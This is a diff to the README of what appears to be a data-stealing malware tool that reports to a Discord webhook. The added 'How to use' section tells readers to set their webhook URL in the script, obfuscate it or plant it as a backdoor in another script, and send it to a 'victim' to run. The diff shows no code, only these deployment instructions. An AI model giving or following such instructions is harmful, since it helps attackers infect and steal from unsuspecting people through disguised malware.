@@ -26,3 +26,10 @@ The author does not hold any responsibility for the harmful use of this tool; re
 ![1](https://user-images.githubusercontent.com/101513307/189696544-a85d54ff-d14a-4a60-a002-e70a93416938.jpeg)
 ![ScreenShot_20220912084151](https://user-images.githubusercontent.com/101513307/189697293-70529022-c2c2-4e92-95f6-cd88eb6f6b04.jpeg)
 
+**How to use**
+Create a webhook on your Discord server. I recommend creating a new server.
+Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in setup.exe at line in 26
+(obfuscate the code or install it as a backdoor in an other script.)
+Send the script to your victim and make them run it.
+
+
